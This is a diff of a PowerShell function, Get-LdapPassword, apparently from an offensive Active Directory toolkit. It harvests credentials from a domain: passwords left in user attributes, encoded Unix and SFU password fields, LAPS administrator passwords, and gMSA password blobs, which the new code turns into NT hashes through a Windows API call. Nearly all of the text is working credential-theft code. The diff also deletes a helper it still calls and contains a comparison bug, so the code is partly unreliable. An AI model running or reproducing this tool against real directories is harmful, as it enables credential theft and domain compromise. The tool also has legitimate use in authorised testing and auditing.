@@ -34,9 +34,9 @@ function Get-LdapPassword {
         $Server = $Env:USERDNSDOMAIN,
 
         [ValidateNotNullOrEmpty()]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]
-        $Credential = [System.Management.Automation.PSCredential]::Empty,
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
 
         [ValidateNotNullOrEmpty()]
         [String[]]
@@ -48,167 +48,164 @@ function Get-LdapPassword {
     )
 
     $searchString = "LDAP://$Server/RootDSE"
-    $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $null, $null)
-    $rootDN = $domainObject.rootDomainNamingContext[0]
-    $ADSpath = "LDAP://$Server/$rootDN"
+    $rootDSE = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null)
+    $rootDN = $rootDSE.rootDomainNamingContext[0]
+    $adsPath = "LDAP://$Server/$rootDN"
 
     # Searching for password in world-readable attributes
-    $filter = $null
-    ForEach ($attribute in $Attributes) {
-        ForEach ($keyword in $Keywords) {
+    $filter = ''
+    foreach ($attribute in $Attributes) {
+        foreach ($keyword in $Keywords) {
             $filter += "($attribute=*$keyword*)"
         }
     }
     $filter = "(&(objectClass=user)(|$filter))"
-    $accounts = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Credential $Credential
-    ForEach ($account in $accounts) {
-        ForEach ($attribute in $attributes) {
-            if ($account.$attribute) {
-                $result = New-Object PSObject 
-                $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
-                $result | Add-Member Noteproperty Attribute $attribute
-                $result | Add-Member Noteproperty Value $account.$attribute
-                $result
+    Get-LdapObject -ADSpath $adsPath -Filter $filter -Credential $Credential | ForEach-Object {
+        foreach ($attribute in $attributes) {
+            if ($_.$attribute) {
+                [pscustomobject] @{
+                    SamAccountName = $_.sAMAccountName
+                    Attribute = $attribute
+                    Value = $_.$attribute
+                }
             }
         }
     }
 
     # Searching for encoded password attributes
     # Reference: https://www.blackhillsinfosec.com/domain-goodness-learned-love-ad-explorer/
-    $filter = "(&(objectClass=user)(|(UnixUserPassword=*)(UserPassword=*)(msSFU30Password=*)(unicodePwd=*)))"
-    $accounts = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Credential $Credential
-    ForEach ($account in $accounts) {
-        if ($account.UnixUserPassword) {
-            $password = [System.Text.Encoding]::ASCII.GetString($account.UnixUserPassword)
-            $result = New-Object PSObject 
-            $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
-            $result | Add-Member Noteproperty Attribute 'UnixUserPassword'
-            $result | Add-Member Noteproperty Value $password
-            $result
-        }
-        if ($account.UserPassword) {
-            $password = [System.Text.Encoding]::ASCII.GetString($account.UserPassword)
-            $result = New-Object PSObject
-            $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
-            $result | Add-Member Noteproperty Attribute 'UserPassword'
-            $result | Add-Member Noteproperty Value $password
-            $result
-        }
-        if ($account.msSFU30Password) {
-            $password = [System.Text.Encoding]::ASCII.GetString($account.msSFU30Password)
-            $result = New-Object PSObject
-            $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
-            $result | Add-Member Noteproperty Attribute 'msSFU30Password'
-            $result | Add-Member Noteproperty Value $password
-            $result
-        }
-        if ($account.unicodePwd) {
-            $password = [System.Text.Encoding]::ASCII.GetString($account.unicodePwd)
-            $result = New-Object PSObject
-            $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
-            $result | Add-Member Noteproperty Attribute 'unicodePwd'
-            $result | Add-Member Noteproperty Value $password
-            $result
+    $filter = ''
+    $attributes = @("UnixUserPassword", "UserPassword", "msSFU30Password", "unicodePwd")
+    foreach ($attribute in $Attributes) {
+        $filter += "($attribute=*)"
+    }
+    $filter = "(&(objectClass=user)(|$filter))"
+    Get-LdapObject -ADSpath $adsPath -Filter $filter -Credential $Credential | ForEach-Object {
+        foreach ($attribute in $attributes) {
+            if ($_.$attribute) {
+                [pscustomobject] @{
+                    SamAccountName = $_.sAMAccountName
+                    Attribute = $attribute
+                    Value = [Text.Encoding]::ASCII.GetString($_.$attribute)
+                }
+            }
         }
     }
 
     # Searching for LAPS passwords
     # Reference: https://adsecurity.org/?p=1790
     $filter = "(&(objectCategory=Computer)(ms-MCS-AdmPwd=*))"
-    $accounts = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Credential $Credential
-    ForEach ($account in $accounts) {
-        if ($account.'ms-MCS-AdmPwd') {
-            if ($account.'ms-MCS-AdmPwdExpirationTime' -ge 0) {
-                $expiration = $([datetime]::FromFileTime([convert]::ToInt64($account.'ms-MCS-AdmPwdExpirationTime',10)))
+    Get-LdapObject -ADSpath $adsPath -Filter $filter -Credential $Credential | ForEach-Object {
+        if ($_.'ms-MCS-AdmPwd') {
+            if ($_.'ms-MCS-AdmPwdExpirationTime' -ge 0) {
+                $expiration = $([datetime]::FromFileTime([convert]::ToInt64($_.'ms-MCS-AdmPwdExpirationTime',10)))
             }
             else{
                 $expiration = 'N/A'
             }
-            $result = New-Object PSObject
-            $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
-            $result | Add-Member Noteproperty Attribute 'ms-MCS-AdmPwd'
-            $result | Add-Member Noteproperty Value $account.'ms-MCS-AdmPwd'
-            $result | Add-Member Noteproperty Expiration $expiration
-            $result
+            [pscustomobject] @{
+                SamAccountName = $_.sAMAccountName
+                Attribute = 'ms-MCS-AdmPwd'
+                Value = $_.'ms-MCS-AdmPwd'
+                #Expiration = $expiration
+            }
         }
     }
 
     # Searching for GMSA passwords
     # Reference: https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/
     $filter = "(&(objectClass=msDS-GroupManagedServiceAccount)(msDS-ManagedPasswordId=*))"
-    $accounts = Get-LdapObject -ADSpath $ADSpath -Filter $filter -Credential $Credential
-    ForEach ($account in $accounts) {
-        if ($account.'msDS-ManagedPassword') {
-            $password = (ConvertFrom-ADManagedPasswordBlob -Blob $account.'msDS-ManagedPassword').CurrentPassword
-            $result = New-Object PSObject
-            $result | Add-Member Noteproperty SamAccountName $account.sAMAccountName
-            $result | Add-Member Noteproperty Attribute 'msDS-ManagedPassword'
-            $result | Add-Member Noteproperty Value $password
-            $result
-        }
-    }
-}
-
-function Local:Get-LdapObject {
-    Param (
-        [Parameter(Mandatory=$true)]
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $ADSpath,
-
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $SearchScope = 'Subtree',
-
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $Filter = '(objectClass=*)',
-
-        [ValidateNotNullOrEmpty()]
-        [String[]]
-        $Properties = '*',
-
-        [ValidateRange(1,10000)] 
-        [Int]
-        $PageSize = 200,
-
-        [ValidateNotNullOrEmpty()]
-        [System.Management.Automation.PSCredential]
-        [System.Management.Automation.Credential()]
-        $Credential = [System.Management.Automation.PSCredential]::Empty
-    )
-
-    if ($Credential.UserName) {
-        $domainObject = New-Object System.DirectoryServices.DirectoryEntry($ADSpath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
-        $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainObject)
-    }
-    else {
-        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
-    }
-    $searcher.SearchScope = $SearchScope
-    $searcher.PageSize = $PageSize
-    $searcher.CacheResults = $false
-    $searcher.filter = $Filter
-    $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
-    $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
-    Try {
-        $results = $searcher.FindAll()
-        $results | Where-Object {$_} | ForEach-Object {
-            $objectProperties = @{}
-            $p = $_.Properties
-            $p.PropertyNames | ForEach-Object {
-                if (($_ -ne 'adspath') -And ($p[$_].count -eq 1)) {
-                    $objectProperties[$_] = $p[$_][0]
-                }
-                elseif ($_ -ne 'adspath') {
-                    $objectProperties[$_] = $p[$_]
-                }
+    Get-LdapObject -ADSpath $adsPath -Filter $filter -Credential $Credential | ForEach-Object {
+        if ($_.'msDS-ManagedPassword') {
+            [pscustomobject] @{
+                SamAccountName = $_.sAMAccountName
+                Attribute = 'msDS-ManagedPassword'
+                Value = ConvertTo-NTHash -Password (ConvertFrom-ADManagedPasswordBlob -Blob $_.'msDS-ManagedPassword').CurrentPassword
             }
-            New-Object -TypeName PSObject -Property ($objectProperties)
         }
-        $results.dispose()
-        $searcher.dispose()
-    } Catch {
-        Write-Error $_ -ErrorAction Stop
     }
 }
+
+function Local:ConvertFrom-ADManagedPasswordBlob {
+    Param (
+        [byte[]] $Blob
+    )
+    $stream = New-object IO.MemoryStream($Blob)
+    $reader = New-Object IO.BinaryReader($stream)
+    $version = $reader.ReadInt16()
+    $reserved = $reader.ReadInt16()
+    $length = $reader.ReadInt32()
+    $currentPasswordOffset = $reader.ReadInt16()
+    $secureCurrentPassword = ReadSecureWString -Buffer $blob -StartIndex $currentPasswordOffset
+    $previousPasswordOffset = $reader.ReadInt16()
+    [SecureString] $securePreviousPassword = $null
+    if($previousPasswordOffset > 0) {
+        $securePreviousPassword = ReadSecureWString -Buffer $blob -StartIndex $previousPasswordOffset
+    }
+    $queryPasswordIntervalOffset = $reader.ReadInt16()
+    $queryPasswordIntervalBinary = [BitConverter]::ToInt64($blob, $queryPasswordIntervalOffset)
+    $queryPasswordInterval = [TimeSpan]::FromTicks($queryPasswordIntervalBinary)
+    $unchangedPasswordIntervalOffset = $reader.ReadInt16()
+    $unchangedPasswordIntervalBinary = [BitConverter]::ToInt64($blob, $unchangedPasswordIntervalOffset)
+    $unchangedPasswordInterval = [TimeSpan]::FromTicks($unchangedPasswordIntervalBinary)
+    New-Object PSObject -Property @{
+        CurrentPassword = $secureCurrentPassword.ToUnicodeString()
+        PreviousPassword = $securePreviousPassword.ToUnicodeString()
+        QueryPasswordInterval = $queryPasswordInterval
+        UnchangedPasswordInterval = $unchangedPasswordInterval
+    }
+}
+
+function Local:ReadSecureWString {
+    Param (
+        [byte[]] $Buffer,
+        [int] $StartIndex
+    )
+    $maxLength = $Buffer.Length - $StartIndex;
+    $result = New-Object SecureString
+    for ($i = $startIndex; $i -lt $buffer.Length; $i += [Text.UnicodeEncoding]::CharSize) {
+        $c = [BitConverter]::ToChar($buffer, $i)
+        if ($c -eq [Char]::MinValue) {
+            return $result
+        }
+        $result.AppendChar($c)
+    }
+}
+
+function Local:ConvertTo-NTHash {
+    Param (
+        [string] $Password
+    )
+    $ntHash = New-Object byte[] 16
+    $unicodePassword = New-Object Win32+UNICODE_STRING $Password
+    [Win32]::RtlCalculateNtOwfPassword([ref] $unicodePassword, $ntHash) | Out-Null
+    $unicodePassword.Dispose()
+    return (($ntHash | ForEach-Object ToString X2) -join '')
+}
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("advapi32.dll", SetLastError = true, EntryPoint = "SystemFunction007", CharSet = CharSet.Unicode)]
+    public static extern int RtlCalculateNtOwfPassword(ref UNICODE_STRING password, [MarshalAs(UnmanagedType.LPArray)] byte[] hash);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct UNICODE_STRING : IDisposable {
+        public ushort Length;
+        public ushort MaximumLength;
+        public IntPtr buffer;
+
+        public UNICODE_STRING(string s) {
+            Length = (ushort)(s.Length * 2);
+            MaximumLength = (ushort)(Length + 2);
+            buffer = Marshal.StringToHGlobalUni(s);
+        }
+
+        public void Dispose() {
+            Marshal.FreeHGlobal(buffer);
+            buffer = IntPtr.Zero;
+        }
+    }
+}
+"@
